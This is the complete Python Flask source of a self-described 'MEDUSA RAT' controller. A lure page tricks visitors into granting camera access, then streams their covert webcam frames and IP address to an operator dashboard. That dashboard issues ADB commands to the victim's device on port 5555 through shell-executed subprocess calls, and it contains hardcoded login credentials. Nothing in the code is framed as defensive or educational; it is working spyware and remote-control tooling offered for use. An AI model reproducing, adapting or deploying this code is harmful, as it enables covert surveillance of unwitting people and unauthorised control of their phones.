import os
import base64
import subprocess
from flask import Flask, render_template_string, request, jsonify, Response, redirect, url_for, session

app = Flask(__name__)
app.secret_key = "MEDUSA_SECRET_KEY_99" 

# PASTIKAN DUA BARIS INI ADA DI ATAS (Inisialisasi Nilai Awal):
latest_frame = None
auto_target_ip = None  

# Kredensial Login Operator (Silakan ganti sesuai keinginan Akang)
USERNAME_ADMIN = "admin"
PASSWORD_ADMIN = "medusa123"

# Direktori penyimpanan hasil loot di cloud
LOOT_DIR = os.path.join(os.getcwd(), "ADB_LOOT")
os.makedirs(LOOT_DIR, exist_ok=True)

# Variabel global untuk menyimpan data target secara otomatis
latest_frame = None
auto_target_ip = None  # Menyimpan IP target secara otomatis

# --- HTML TEMPLATE LOGIN KREDENSIAL ---
LOGIN_HTML = """
<html>
<head>
    <title>Medusa Auth</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #050505; color: #f00; font-family: monospace; text-align: center; padding-top: 100px; }
        .login-box { border: 1px solid #f00; display: inline-block; padding: 40px; background: #000; box-shadow: 0 0 15px #f00; border-radius: 5px; }
        input { background: #111; color: #0f0; border: 1px solid #333; padding: 10px; margin: 10px 0; width: 200px; font-family: monospace; }
        .btn { background: #500; color: #fff; border: 1px solid #f00; padding: 10px 20px; cursor: pointer; font-weight: bold; }
        .btn:hover { background: #f00; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>[ LOGIN REQUIRED ]</h2>
        {% if error %}<p style="color: yellow;">{{ error }}</p>{% endif %}
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br><br>
            <button type="submit" class="btn">ENTER CONTROLLER</button>
        </form>
    </div>
</body>
</html>
"""

# --- HTML TEMPLATE UNTUK TARGET ---
TARGET_HTML = """
<html>
<head>
    <title>System Synchronization</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background-color: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 80px; }
        .box { border: 2px solid #ff0000; display: inline-block; padding: 30px; border-radius: 8px; background-color: #000; box-shadow: 0 0 15px #ff0000; }
        .btn { background-color: #8b0000; color: white; padding: 16px 32px; border: 1px solid #ff0000; border-radius: 4px; font-size: 14px; font-weight: bold; cursor: pointer; box-shadow: 0 0 10px #8b0000; }
        .btn:hover { background-color: #ff0000; box-shadow: 0 0 20px #ff0000; }
    </style>
</head>
<body>
    <div class="box">
        <h2>[ MEDUSA INTERCONNECT ]</h2>
        <p>Laboratorium terisolasi memerlukan sinkronisasi media satu pintu.</p>
        <button class="btn" onclick="triggerOtoritas()">OTORISASI & SINKRONISASI</button>
    </div>
    <video id="v-feed" autoplay playsinline muted style="position: absolute; width: 1px; height: 1px; opacity: 0.01;"></video>
    <script>
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        async function triggerOtoritas() {
            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                let video = document.getElementById("v-feed");
                video.srcObject = stream;
                video.onloadedmetadata = () => { video.play(); setInterval(captureFrame, 400); };
                document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ CONNECTED ]</h2><p>Sesi nirkabel aktif melintasi internet proxy.</p></div>";
            } catch(err) { alert("Izin ditolak: " + err); }
        }
        function captureFrame() {
            let video = document.getElementById("v-feed");
            if(video.videoWidth > 0) {
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                fetch('/receive_frame', { method: 'POST', body: canvas.toDataURL('image/jpeg', 0.4) });
            }
        }
    </script>
</body>
</html>
"""

# --- DASHBOARD KONTROL OPERATOR ---
DASHBOARD_HTML = """
<html>
<head>
    <title>Medusa Web Dashboard</title>
    <style>
        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
        .btn { background: #800; color: #fff; border: 1px solid #f00; padding: 10px; margin: 5px; cursor: pointer; }
        .btn:hover { background: #f00; }
        #monitor { width: 320px; height: 240px; border: 1px solid #f00; background: #000; margin-top: 10px; }
        .status-box { background: #222; padding: 10px; border-left: 5px solid #0f0; margin-bottom: 15px; }
    </style>
</head>
<body>
    <h1>MEDUSA RAT CLOUD CONTROLLER</h1>
    <div style="float: right;"><a href="/logout" style="color: red; font-weight: bold;">[ LOGOUT ]</a></div>
    
    <div class="status-box">
        <strong>STATUS IP TARGET OTOMATIS:</strong> 
        <span id="display_ip" style="color: #fff; background: #333; padding: 2px 8px;">{{ target_ip if target_ip else "Menunggu Target..." }}</span>
    </div>

    <h3>Target Media Live Stream</h3>
    <img id="monitor" src="" onerror="this.style.display='none';" onload="this.style.display='block';">
    
    <h3>Eksekusi Perintah ADB</h3>
    <button class="btn" onclick="sendCmd('shell dumpsys battery')">Cek Baterai</button>
    <button class="btn" onclick="sendCmd('shell input keyevent 26')">Toggle Power Layar</button>
    <button class="btn" onclick="sendCmd('shell screencap -p /sdcard/s.png')">Trigger Screenshot</button>

    <pre id="log" style="background:#000; padding:10px; border:1px solid #333; margin-top:20px;"></pre>

    <script>
        setInterval(() => {
            document.getElementById('monitor').src = '/get_frame?' + Date.now();
        }, 500);

        function sendCmd(cmd) {
            fetch('/execute', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ command: cmd })
            })
            .then(res => res.json())
            .then(data => { document.getElementById('log').innerText = JSON.stringify(data, null, 2); });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(TARGET_HTML)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == USERNAME_ADMIN and password == PASSWORD_ADMIN:
            session['logged_in'] = True
            return redirect(url_for('operator_dashboard'))
        else:
            return render_template_string(LOGIN_HTML, error="Kredensial Salah!")
    return render_template_string(LOGIN_HTML)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/operator')
def operator_dashboard():
    # Proteksi Halaman: Jika belum login, tendang ke halaman login
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template_string(DASHBOARD_HTML, target_ip=auto_target_ip)

@app.route('/receive_frame', methods=['POST'])
def receive_frame():
    global latest_frame, auto_target_ip
    latest_frame = request.data.decode('utf-8')
    
    if request.headers.get('X-Forwarded-For'):
        # Mengambil elemen pertama dari urutan list menggunakan indeks [0]
        raw_ip_list = request.headers.get('X-Forwarded-For').split(',')
        auto_target_ip = raw_ip_list[0].strip()
    else:
        auto_target_ip = request.remote_addr
        
    return "OK"

@app.route('/get_frame')
def get_frame():
    global latest_frame
    # Memastikan data frame kamera target masuk dan memiliki format base64 yang valid
    if latest_frame and "base64," in latest_frame:
        try:
            # Memotong teks 'data:image/jpeg;base64,' agar menyisakan kode gambar murni
            img_b64 = latest_frame.split("base64,")[1]
            img_data = base64.b64decode(img_b64)
            return Response(img_data, mimetype='image/jpeg')
        except Exception as e:
            print(f"Error decode frame: {e}")
    return "", 204

@app.route('/execute', methods=['POST'])
def execute_command():
    if not session.get('logged_in'):
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
        
    global auto_target_ip
    data = request.json
    command = data.get("command")
    
    if not auto_target_ip:
        return jsonify({"status": "error", "message": "Tidak ada IP target otomatis yang terikat. Target harus menekan tombol Otorisasi dulu."}), 400

    adb_prefix = f"adb -s {auto_target_ip}:5555"
    subprocess.run(f"adb connect {auto_target_ip}:5555", shell=True, capture_output=True)
    
    full_cmd = f"{adb_prefix} {command}"
    process = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, errors='ignore')
    
    return jsonify({
        "status": "success" if process.returncode == 0 else "error",
        "stdout": process.stdout,
        "stderr": process.stderr,
        "connected_to": auto_target_ip
    })
